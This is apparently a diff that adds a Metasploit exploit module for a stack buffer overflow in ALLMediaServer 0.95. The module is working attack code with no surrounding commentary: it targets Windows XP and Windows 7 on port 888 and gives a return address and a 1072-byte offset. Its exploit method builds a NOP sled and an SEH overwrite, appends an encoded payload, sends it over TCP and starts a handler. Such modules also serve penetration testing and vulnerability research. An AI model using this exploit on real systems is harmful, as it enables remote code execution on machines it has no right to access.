@@ -1,0 +1,73 @@
+require 'msf/core'
+ 
+class Metasploit4 < Msf::Exploit::Remote
+    Rank = NormalRanking
+ 
+    include Msf::Exploit::Remote::Tcp
+    include Msf::Exploit::Seh
+ 
+    def initialize(info = {})
+        super(update_info(info,
+            'Name'           => 'ALLMediaServer 0.95 Buffer Overflow',
+            'Description'    => %q{
+                This module exploits a stack buffer overflow in ALLMediaServer 0.95.
+                The vulnerability is caused due to a boundary error within the
+                handling of HTTP request.
+            },
+            'License'        => MSF_LICENSE,
+            'Author'         =>
+                [
+                    'Anurag Srivastava', # Remote exploit and Metasploit module
+                ],
+            'References'     =>
+                [
+                    [ 'EDB', '43406' ]
+                ],
+            'DefaultOptions' =>
+                {
+                    'ExitFunction' => 'process', #none/process/thread/seh
+                },
+            'Platform'       => 'win',
+            'Payload'        =>
+                {
+                    'BadChars' => "",
+                    'Space' => 660,
+                    'DisableNops' => true
+                },
+ 
+            'Targets'        =>
+                [
+                    [ 'ALLMediaServer 0.95 / Windows XP SP3 - English',
+                        {
+                            'Ret'       =>   0x00408315, # POP # POP # POP # RET 
+                            'Offset'    =>   1072
+                        }
+                    ],
+                    [ 'ALLMediaServer 0.95 / Windows 7 SP1 - English',
+                        {
+                            'Ret'       =>   0x00408315, #  POP # POP # POP # RET 
+                            'Offset'    =>   1072
+                        }
+                    ],
+                ],
+            'Privileged'     => false,
+            'DisclosureDate' => 'Dec 28 2017',
+            'DefaultTarget'  => 1))
+ 
+        register_options([Opt::RPORT(888)], self.class)
+ 
+    end
+	
+    def exploit
+        connect
+	buffer = ""
+        buffer << make_nops(target['Offset'])
+	buffer << generate_seh_record(target.ret)
+	buffer << make_nops(19)
+        buffer << payload.encoded
+        print_status("Sending payload ...")
+        sock.put(buffer)
+	handler
+        disconnect
+    end
+end
